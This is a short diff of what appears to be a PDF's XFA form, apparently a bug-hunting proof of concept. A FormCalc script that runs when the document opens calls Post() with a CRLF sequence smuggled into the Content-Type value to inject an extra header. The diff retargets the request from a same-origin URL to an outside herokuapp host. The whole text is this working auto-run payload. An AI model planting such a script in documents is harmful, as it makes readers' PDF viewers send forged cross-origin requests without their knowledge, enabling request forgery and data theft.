@@ -19,7 +19,7 @@ stream
         <field id="Hello World!">
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
-                    Post("http://sameOrigin.com/index.html","YOUR POST DATA","text/plain","utf-8","Content-Type: Dolphin&#x0d;&#x0a;Test: AAA")
+                    Post("http://bughunt1307.herokuapp.com","YOUR POST DATA","text/plain","utf-8","Content-Type: Dolphin&#x0d;&#x0a;Test: AAA")
                 </script>
             </event>
         </field>
